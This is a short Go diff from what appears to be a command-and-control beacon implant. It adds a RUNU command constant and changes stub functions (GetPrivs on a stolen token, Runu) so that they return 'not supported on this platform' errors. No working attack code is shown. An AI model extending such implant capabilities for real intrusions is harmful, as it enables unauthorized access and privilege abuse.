@@ -97,6 +97,7 @@ const (
 	CMD_TYPE_INJECT_X64                 = 43
 	CMD_TYPE_INJECT_X86                 = 9
 	CMD_TYPE_BOF                        = 100
+	CMD_TYPE_RUNU                       = 76
 )
 
 func ParseCommandShell(b []byte) (string, []byte, error) {
@@ -534,9 +535,13 @@ func HideConsole() error {
 }
 
 func GetPrivs(privs []string, stolenToken uintptr) ([]byte, error) {
-	return []byte("this platform not supports HideConsole now."), nil
+	return nil, errors.New("This function is not supported on this platform now.")
 }
 
 func SetProcessDPIAware() error {
 	return errors.New("SetProcessDPIAware is not supported on this platform now.")
+}
+
+func Runu(b []byte) ([]byte, error) {
+	return nil, errors.New("This function is not supported on this platform now.")
 }
